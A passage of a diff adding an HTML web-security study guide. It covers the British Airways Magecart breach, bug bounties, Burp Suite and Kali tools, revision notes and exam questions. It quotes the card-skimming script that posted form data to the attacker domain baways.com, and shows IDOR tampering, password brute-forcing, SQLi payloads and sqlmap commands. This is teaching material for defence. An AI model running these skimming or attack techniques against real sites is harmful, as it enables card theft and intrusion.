+  expiry: document.querySelector('[name=expirymonth]').value + '/' +
+          document.querySelector('[name=expiryyear]').value,
+  email: document.querySelector('[name=email]').value
+};
+fetch('https://baways.com/gateway', {  // ← attacker's domain (baways.com vs ba.com!)
+  method: 'POST',
+  body: JSON.stringify(formData)
+});</span>
+
+<span class="cm"># Attacker registered baways.com — similar to ba.com
+# HTTPS certificate obtained from Let's Encrypt (so it had a padlock!)
+# 500,000 card details exfiltrated in real-time as customers typed</span>
+
+<span class="cr">STEP 4: Not Detected for 15 Days</span>
+  → No CSP to block scripts from baways.com
+  → No Subresource Integrity (SRI) on loaded scripts
+  → No real-time monitoring of page script changes
+  → Detected by RiskIQ threat intelligence (external company)
+
+<span class="cg">WHAT WOULD HAVE PREVENTED IT:</span>
+  1. Content Security Policy: script-src 'self' cdn.ba.com; → blocked baways.com
+  2. Subresource Integrity: &lt;script src="lib.js" integrity="sha256-HASH"&gt;
+     → script tampered = browser refuses to load
+  3. Real-time monitoring of JavaScript assets
+  4. Third-party vendor security auditing
+  5. CSP violation reporting → would have detected day 1</pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>How would a strict CSP header have prevented the BA breach? Write the specific CSP header value needed.</li>
+      <li>What is Subresource Integrity (SRI)? Write the HTML tag for loading jQuery with SRI protection.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>The BA breach was preventable with a 1-line CSP header. £183 million GDPR fine for 22 lines of attacker JavaScript — the most expensive web vulnerability in history per line of attack code. It proved that third-party scripts are a massive attack surface and that CSP + SRI are essential for any payment processing page.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T126 ===== -->
+<div class="sec" id="t126">
+  <div class="sh"><span class="sn">Topic 126</span><h2>Bug Bounty Basics</h2><span class="se">🎯</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Bug bounties are programs where companies pay security researchers to find vulnerabilities — offering legitimate income for ethical hackers ranging from $50 for low-severity to $1M+ for critical zero-days.</div>
+    <div class="sub"><h3>Getting Started</h3>
+      <div class="cg2">
+        <div class="card"><div class="ci2">🏆</div><div class="ct">HackerOne</div><div class="cd2">Largest bug bounty platform. Hosts Google, Microsoft, GitHub, Uber, Shopify. $250M+ paid out.</div></div>
+        <div class="card"><div class="ci2">🐛</div><div class="ct">Bugcrowd</div><div class="cd2">Major platform with company-run bounty programs. Good for beginners — many VDPs (no pay but no legal risk).</div></div>
+        <div class="card"><div class="ci2">🌐</div><div class="ct">Intigriti</div><div class="cd2">European-focused platform. GDPR compliance focus. Growing rapidly with EU companies.</div></div>
+        <div class="card"><div class="ci2">🔓</div><div class="ct">Synack</div><div class="cd2">Invite-only vetted researchers. Higher pay, private programs. Requires skills assessment to join.</div></div>
+        <div class="card"><div class="ci2">🏛️</div><div class="ct">NCSC Disclosure</div><div class="cd2">UK government vulnerability disclosure. For public sector. Report via NCSC.</div></div>
+        <div class="card"><div class="ci2">📖</div><div class="ct">HackTheBox / THM</div><div class="cd2">Practice platforms. Complete machines to build skills. HTB has a job board for security careers.</div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Bug Bounty Payout Guide</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Severity</th><th>Examples</th><th>HackerOne Range</th><th>Real Payout Examples</th></tr></thead>
+        <tbody>
+          <tr><td style="color:var(--pink)">CRITICAL</td><td>RCE, SQLi on main DB, full account takeover</td><td>$5,000–$1,000,000+</td><td>Apple: $1M for 0-click iOS RCE; Google: $600K for Chrome sandbox escape</td></tr>
+          <tr><td style="color:var(--orange)">HIGH</td><td>SSRF with internal access, IDOR exposing many users</td><td>$2,000–$25,000</td><td>Shopify IDOR: $25,000; Uber SSRF: $6,500</td></tr>
+          <tr><td style="color:var(--yellow)">MEDIUM</td><td>XSS on sensitive page, CSRF on auth action</td><td>$500–$5,000</td><td>Stored XSS on GitHub: $10,000; Facebook XSS: $5,000</td></tr>
+          <tr><td style="color:var(--teal)">LOW</td><td>Open redirect, info disclosure, self-XSS</td><td>$50–$1,000</td><td>Open redirect on Google: $500; minor info leak: $150</td></tr>
+          <tr><td>INFO</td><td>Security misconfig, missing headers</td><td>$0 (Hall of fame)</td><td>VDP — no payment, public credit only</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Bug Bounty Methodology</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">BUG BOUNTY HUNTING WORKFLOW</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">subfinder -d target.com -o subdomains.txt</span>     <span class="cm"># Find all subdomains</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">amass enum -d target.com</span>                        <span class="cm"># Comprehensive enum</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">httpx -l subdomains.txt -status-code -title</span>     <span class="cm"># Find live hosts</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei -l subdomains.txt -t exposures/</span>         <span class="cm"># Find exposed panels</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">gau target.com | grep "?.*="</span>                   <span class="cm"># Find parameters from Wayback</span>
+
+<span class="cm">━━━ SCOPE MANAGEMENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="out">ALWAYS check:
+  - What's IN scope (specific domains, apps)
+  - What's OUT of scope (never test these!)
+  - Allowed testing methods (no DoS, no social engineering)
+  - Responsible disclosure process</span>
+
+<span class="cm">━━━ WRITING A GOOD REPORT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cg">1. Title:       Clear, specific: "Stored XSS in /comments via name parameter"
+2. Severity:    CVSS score + justification
+3. Summary:     1-2 sentences: what the bug is, what it allows
+4. Steps to Reproduce: Numbered, exact steps with screenshots/videos
+5. Impact:      Realistic worst-case: "Attacker can steal session cookies of all users"
+6. PoC:         Working proof-of-concept code
+7. Remediation: Specific fix recommendation</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Create a free account on HackerOne. Find a public bug bounty program with a Vulnerability Disclosure Policy (VDP). Read their scope. What is in and out of scope?</li>
+      <li>You find an IDOR on a company's website that exposes all user emails. Write a professional bug report for it.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Bug bounties democratise security research. You don't need a degree — you need skills, curiosity, and persistence. Start with HackTheBox/TryHackMe to build skills, then move to bug bounty platforms. The best bug bounty hunters are methodical, not lucky. A clear, reproducible report with real impact description = higher bounty payout.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T127 ===== -->
+<div class="sec" id="t127">
+  <div class="sh"><span class="sn">Topic 127</span><h2>Web Testing with Burp Suite</h2><span class="se">🔧</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Burp Suite is the essential web app testing proxy — intercept, modify, replay, and automate HTTP requests to find and exploit web vulnerabilities across all OWASP Top 10 categories.</div>
+    <div class="sub"><h3>Complete Burp Suite Workflow</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">BURP SUITE — COMPLETE WORKFLOW</div></div>
+        <div class="term-body"><pre><span class="cm">━━━ PROXY — Intercept &amp; Modify ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Burp intercepts every request — can modify before sending:</span>
+<span class="fl">GET /profile?user_id=1001 HTTP/1.1
+Host: target.com
+Cookie: session=your_session_cookie</span>
+
+<span class="cm"># In Burp Proxy → Intercept → Modify user_id → Forward</span>
+<span class="err">GET /profile?user_id=1002 HTTP/1.1   ← Changed to test IDOR</span>
+
+<span class="cm">━━━ REPEATER — Manual Request Testing ━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Right-click any request → Send to Repeater</span>
+<span class="cm"># Modify parameters, click Send, see response immediately</span>
+<span class="cm"># Perfect for: SQLi testing, IDOR, auth bypass</span>
+
+<span class="cm">━━━ INTRUDER — Automated Fuzzing/Brute Force ━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Positions: mark injection points with §markers§</span>
+<span class="fl">POST /login HTTP/1.1
+username=admin&amp;password=§PASSWORD§</span>
+
+<span class="cm"># Attack types:</span>
+<span class="cg">Sniper</span>     → One payload list, one position at a time
+<span class="cg">Battering ram</span> → Same payload in all positions
+<span class="cg">Pitchfork</span>  → Multiple lists, one each per position (credential stuffing)
+<span class="cg">Cluster bomb</span> → All combinations (brute force usernames + passwords)
+
+<span class="cm"># Payload list: rockyou.txt for passwords, usernames for users</span>
+<span class="cm"># Filter: sort by response length — correct password = different length!</span>
+
+<span class="cm">━━━ DECODER — Encode/Decode Manually ━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="fl">Base64:   dXNlcjoxMDAx → user:1001  (decode → modify → re-encode → IDOR!)</span>
+<span class="fl">URL:      %27+OR+%271%27%3D%271 → ' OR '1'='1  (SQLi)</span>
+<span class="fl">HTML:     &amp;lt;script&amp;gt; → &lt;script&gt;</span>
+
+<span class="cm">━━━ KEY SHORTCUTS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cg">Ctrl+R</span>     → Send to Repeater
+<span class="cg">Ctrl+I</span>     → Send to Intruder
+<span class="cg">Ctrl+Shift+B</span> → Decode selected text
+<span class="cg">Ctrl+Space</span> → Auto-complete in Decoder
+<span class="cg">F12</span>        → Switch Intercept on/off
+
+<span class="cm">━━━ EXTENSIONS (BApp Store) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="out">Active Scan++    → Extended scanning rules
+Autorize         → Test IDOR: replay requests as other users
+JWT Editor       → Modify and attack JWT tokens
+Param Miner      → Discover hidden parameters via bruteforce
+Logger++         → Advanced request logging and filtering
+Turbo Intruder   → Python-scriptable high-speed fuzzer
+Retire.js        → Detect vulnerable JavaScript libraries</span></pre></div>
+      </div>
+    </div>
+    <div class="sub"><h3>SQLmap &amp; Other CLI Tools</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">WEB SECURITY TOOLS — KALI REFERENCE</div></div>
+        <div class="term-body"><pre><span class="cm"># ── sqlmap ── </span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -u "URL?id=1" --dbs --batch</span>           <span class="cm"># Auto SQL injection</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sqlmap -r request.txt --level=5 --risk=3</span>     <span class="cm"># From saved Burp request</span>
+
+<span class="cm"># ── nikto — web server scanner ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nikto -h https://target.com -ssl</span>
+
+<span class="cm"># ── gobuster — directory/file brute force ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/big.txt</span>
+
+<span class="cm"># ── ffuf — fast web fuzzer ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ffuf -u https://target.com/page?id=FUZZ -w 1-10000.txt</span>   <span class="cm"># IDOR fuzzing</span>
+
+<span class="cm"># ── wfuzz — parameter fuzzer ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">wfuzz -c -z file,passwords.txt -d "user=admin&amp;pass=FUZZ" https://target.com/login</span>
+
+<span class="cm"># ── XSS tools ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">dalfox url "https://target.com/search?q=test"</span>  <span class="cm"># XSS scanner</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">beef-xss</span>                                        <span class="cm"># Browser exploitation framework</span>
+
+<span class="cm"># ── Vulnerable practice apps ──</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker run -d -p 80:80 vulnerables/web-dvwa</span>    <span class="cm"># DVWA</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker run -d -p 8080:8080 webgoat/goat-and-wolf</span>  <span class="cm"># WebGoat</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">docker run -d -p 3000:3000 bkimminich/juice-shop</span>  <span class="cm"># OWASP Juice Shop</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Install OWASP Juice Shop locally. Use Burp Suite to find and exploit an SQL injection vulnerability. Document each step with screenshots.</li>
+      <li>Using DVWA (XSS-Stored, low), inject a JavaScript payload that sends your own cookie to a Burp Collaborator URL. Confirm receipt of the request.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Burp Suite mastery separates amateur web testers from professionals. Learn every module: Proxy for visibility, Repeater for manual testing, Intruder for automation, Decoder for encoding work. Combined with sqlmap, ffuf, and nuclei, you have a complete web security testing toolkit that professionals use daily.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T128 REVISION ===== -->
+<div class="sgt">📝 Revision</div>
+<div class="sec" id="t128">
+  <div class="sh"><span class="sn">Topic 128</span><h2>Unit 7 Revision Notes</h2><span class="se">📝</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Quick Reference Glossary</h3>
+      <div class="rv">
+        <div class="ri"><span class="rt">SQLi</span><span class="rd">Inject SQL into user input. Bypass auth, dump DB. Fix: parameterised queries.</span></div>
+        <div class="ri"><span class="rt">XSS Stored</span><span class="rd">Script stored in DB, runs for all visitors. Steal cookies, keylog. Fix: output encoding + CSP.</span></div>
+        <div class="ri"><span class="rt">XSS Reflected</span><span class="rd">Script in URL, immediate response. Requires victim to click link.</span></div>
+        <div class="ri"><span class="rt">XSS DOM</span><span class="rd">Script via DOM manipulation, never hits server. innerHTML = dangerous.</span></div>
+        <div class="ri"><span class="rt">CSRF</span><span class="rd">Force authenticated browser to make request. Fix: CSRF token + SameSite=Strict.</span></div>
+        <div class="ri"><span class="rt">IDOR</span><span class="rd">Change ID in URL to access other users' data. Fix: server-side ownership check.</span></div>
+        <div class="ri"><span class="rt">SSRF</span><span class="rd">Server fetches attacker-specified URL. Reaches cloud metadata, internal services.</span></div>
+        <div class="ri"><span class="rt">XXE</span><span class="rd">XML external entities read local files. Fix: disable DOCTYPE in XML parser.</span></div>
+        <div class="ri"><span class="rt">File Upload RCE</span><span class="rd">Upload PHP webshell → execute commands. Fix: allowlist + no execution + outside webroot.</span></div>
+        <div class="ri"><span class="rt">Clickjacking</span><span class="rd">Invisible iframe over button. Fix: X-Frame-Options: DENY.</span></div>
+        <div class="ri"><span class="rt">Session Fixation</span><span class="rd">Attacker sets session ID before login. Fix: regenerate session ID on login.</span></div>
+        <div class="ri"><span class="rt">Session Hijacking</span><span class="rd">Steal valid session token. Fix: HttpOnly + Secure + short timeout.</span></div>
+        <div class="ri"><span class="rt">Mass Assignment</span><span class="rd">Send extra JSON fields like role=admin. Fix: allowlist accepted properties.</span></div>
+        <div class="ri"><span class="rt">JWT Alg:None</span><span class="rd">Change algorithm to "none", remove signature. Server accepts! Fix: verify always.</span></div>
+        <div class="ri"><span class="rt">CSP</span><span class="rd">Content Security Policy — whitelist scripts/styles. Primary XSS mitigation.</span></div>
+        <div class="ri"><span class="rt">HttpOnly</span><span class="rd">Cookie flag: JS cannot read cookie. Prevents XSS cookie theft.</span></div>
+        <div class="ri"><span class="rt">SameSite=Strict</span><span class="rd">Cookie not sent cross-site. Prevents CSRF entirely.</span></div>
+        <div class="ri"><span class="rt">Parameterised Query</span><span class="rd">Input bound to ? placeholder, treated as data not SQL. Primary SQLi fix.</span></div>
+        <div class="ri"><span class="rt">OWASP Top 10 #1</span><span class="rd">Broken Access Control. IDOR, force browse, privilege escalation. In 94% of apps.</span></div>
+        <div class="ri"><span class="rt">Magecart</span><span class="rd">JS skimming attack. Injected script sends card data to attacker. BA breach 2018.</span></div>
+        <div class="ri"><span class="rt">Bug Bounty</span><span class="rd">Company pays researchers to find vulns. Critical = $5K–$1M. Platforms: H1, Bugcrowd.</span></div>
+        <div class="ri"><span class="rt">Burp Suite</span><span class="rd">Web app proxy. Intercept, Repeater, Intruder, Decoder. Industry standard.</span></div>
+        <div class="ri"><span class="rt">sqlmap</span><span class="rd">Automated SQLi tool. --dbs, --dump, --os-shell. Use only with permission.</span></div>
+        <div class="ri"><span class="rt">SRI</span><span class="rd">Subresource Integrity. Browser checks hash of external script. Prevents supply chain XSS.</span></div>
+        <div class="ri"><span class="rt">Blind SQLi</span><span class="rd">No data returned. Infer via true/false responses or SLEEP() timing.</span></div>
+      </div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>Attack → Defence Quick Reference</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Attack</th><th>One-Line Description</th><th>Primary Fix</th><th>Kali Tool</th></tr></thead>
+        <tbody>
+          <tr><td>SQLi</td><td>SQL in user input breaks query</td><td>Parameterised queries</td><td>sqlmap</td></tr>
+          <tr><td>Stored XSS</td><td>Malicious JS stored, runs for all</td><td>Output encoding + CSP</td><td>dalfox, BeEF</td></tr>
+          <tr><td>Reflected XSS</td><td>XSS in URL, immediate execution</td><td>Output encoding</td><td>Burp Repeater</td></tr>
+          <tr><td>CSRF</td><td>Force browser to make requests</td><td>CSRF token + SameSite</td><td>Burp CSRF PoC</td></tr>
+          <tr><td>IDOR</td><td>Change ID → access others' data</td><td>Server-side ownership check</td><td>Burp Intruder, ffuf</td></tr>
+          <tr><td>File Upload</td><td>Upload webshell → RCE</td><td>Allowlist + outside webroot</td><td>Burp Intercept</td></tr>
+          <tr><td>Clickjacking</td><td>Hidden iframe tricks clicks</td><td>X-Frame-Options: DENY</td><td>Burp clickjacking PoC</td></tr>
+          <tr><td>Session Hijack</td><td>Steal valid session token</td><td>HttpOnly + Secure + short TTL</td><td>XSS + Burp</td></tr>
+          <tr><td>SSRF</td><td>Server requests internal resource</td><td>Allowlist + block private IPs</td><td>Burp Collaborator</td></tr>
+          <tr><td>XXE</td><td>XML entities read local files</td><td>Disable external entities</td><td>Burp XXE payloads</td></tr>
+          <tr><td>Mass Assignment</td><td>Extra fields escalate privileges</td><td>Allowlist accepted fields</td><td>Burp Repeater</td></tr>
+          <tr><td>Auth Bypass</td><td>JWT alg:none, token manipulation</td><td>Always verify JWT signature</td><td>jwt_tool</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>📋 Exam Practice Questions</h3>
+      <div class="tw"><table>
+        <thead><tr><th>#</th><th>Question</th><th>Marks</th><th>Key Points</th></tr></thead>
+        <tbody>
+          <tr><td>Q1</td><td>Explain SQL injection. Show a vulnerable query and the fix. What types of SQLi exist?</td><td>8</td><td>Input in SQL string; auth bypass/UNION; fix=parameterised queries; types: in-band, blind, time-based</td></tr>
+          <tr><td>Q2</td><td>Compare stored, reflected, and DOM-based XSS. What is the difference in persistence and detection?</td><td>6</td><td>Stored=DB, all visitors; Reflected=URL, one victim; DOM=client-side JS, never hits server</td></tr>
+          <tr><td>Q3</td><td>What is CSRF? Draw the attack flow and explain how CSRF tokens and SameSite cookies prevent it.</td><td>7</td><td>Cross-site form submission; browser sends cookies automatically; token=unguessable; SameSite=no cross-site cookie</td></tr>
+          <tr><td>Q4</td><td>What is IDOR? Give an example and explain the correct defence.</td><td>5</td><td>Change ID in request to access other objects; fix=server check ownership of EVERY request</td></tr>
+          <tr><td>Q5</td><td>Explain SSRF. Why is it particularly dangerous in cloud environments? Give a real example.</td><td>7</td><td>Server fetches internal URL; cloud metadata = credentials; Capital One 2019: IMDSv1 exploited</td></tr>
+          <tr><td>Q6</td><td>What cookie security flags must always be set on session cookies? Explain what each prevents.</td><td>6</td><td>HttpOnly=XSS theft; Secure=HTTPS only; SameSite=Strict=CSRF</td></tr>
+          <tr><td>Q7</td><td>Describe the British Airways Magecart attack. What two security controls would have prevented it?</td><td>6</td><td>JS injection stealing card data; CSP would block external script; SRI would detect modification</td></tr>
+          <tr><td>Q8</td><td>List the OWASP Top 10 (2021). Which was #1 and why was it ranked so high?</td><td>8</td><td>Broken Access Control (#1, 94% of apps); then Crypto Failures, Injection, Insecure Design, Misconfiguration...</td></tr>
+          <tr><td>Q9</td><td>What is an XXE attack? Show a malicious XML payload and explain how to fix the vulnerability.</td><td>6</td><td>DOCTYPE + ENTITY reads files; show payload; fix=disable external entities in parser</td></tr>
+          <tr><td>Q10</td><td>What is a bug bounty? Describe the methodology for finding an IDOR vulnerability and writing a report.</td><td>7</td><td>Company pays researchers; IDOR: enumerate IDs in Burp Intruder; report: title, steps, impact, PoC, fix</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="pills">
+      <span class="pill">💉 SQLi → parameterised queries</span>
+      <span class="pill g">📜 XSS → output encoding + CSP</span>
+      <span class="pill o">🎣 CSRF → token + SameSite</span>
+      <span class="pill r">🔢 IDOR → server ownership check</span>
+      <span class="pill">🌀 SSRF → allowlist + IMDSv2</span>
+      <span class="pill g">🍪 HttpOnly + Secure + SameSite</span>
+      <span class="pill o">📁 Uploads → outside webroot</span>
+      <span class="pill r">✈️ BA breach = 1 CSP header missed</span>
+    </div>
+    <div class="concl"><div class="cl">📌 Unit 7 Final Takeaway</div>
+      <p>Web security failures are responsible for the majority of data breaches. The common thread in almost every attack — SQLi, XSS, CSRF, IDOR, SSRF, XXE — is <strong>trusting user-controlled input</strong>. The golden rules are: validate all input, encode all output, parameterise all queries, check authorization on every request, and never trust the client. Master Burp Suite, practice on DVWA/Juice Shop, study OWASP, and hunt bugs legally on HackerOne. <strong>The web is the most attacked surface in cybersecurity — and the most rewarding field to defend.</strong></p>
+    </div>
+  </div>
+</div>
+
+<div style="text-align:center;padding:40px 0 60px;opacity:.25;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:#0a3028;letter-spacing:2px;">
+  UNIT 7 // WEB SECURITY // TOPICS 109–128 // DEEP DIVE EDITION // COMPLETE STUDY GUIDE
+</div>
+</div>
+
+<script>
+// Spider web network canvas
+const cv = document.getElementById('web');
+const cx = cv.getContext('2d');
+cv.width = window.innerWidth;
+cv.height = window.innerHeight;
+
+const pts = [];
+for(let i = 0; i < 60; i++){
+  pts.push({
+    x: Math.random()*cv.width, y: Math.random()*cv.height,
+    vx: (Math.random()-.5)*.35, vy: (Math.random()-.5)*.35,
+    r: Math.random()*1.8+0.5,
+    alpha: Math.random()*.18+0.04,
+    color: Math.random()>.6 ? '#00c8aa' : Math.random()>.5 ? '#39ff14' : '#f1c40f'
+  });
+}
+
+function loop(){
+  cx.clearRect(0,0,cv.width,cv.height);
+  for(let i=0;i<pts.length;i++){
+    const p=pts[i];
+    p.x+=p.vx; p.y+=p.vy;
+    if(p.x<0||p.x>cv.width)p.vx*=-1;
+    if(p.y<0||p.y>cv.height)p.vy*=-1;
+    cx.beginPath();cx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    cx.fillStyle=p.color;cx.globalAlpha=p.alpha;cx.fill();
+    for(let j=i+1;j<pts.length;j++){
+      const q=pts[j];
+      const dx=p.x-q.x,dy=p.y-q.y,d=Math.sqrt(dx*dx+dy*dy);
+      if(d<115){
+        cx.beginPath();cx.moveTo(p.x,p.y);cx.lineTo(q.x,q.y);
+        cx.strokeStyle='#00c8aa';cx.globalAlpha=(1-d/115)*.08;
+        cx.lineWidth=0.5;cx.stroke();
+      }
+    }
+  }
+  cx.globalAlpha=1;
+  requestAnimationFrame(loop);
+}
+loop();
+
+window.addEventListener('resize',()=>{cv.width=window.innerWidth;cv.height=window.innerHeight;});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{e.preventDefault();
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t)t.scrollIntoView({behavior:'smooth',block:'start'});
+  });
+});
+</script>
+</body>
+</html>
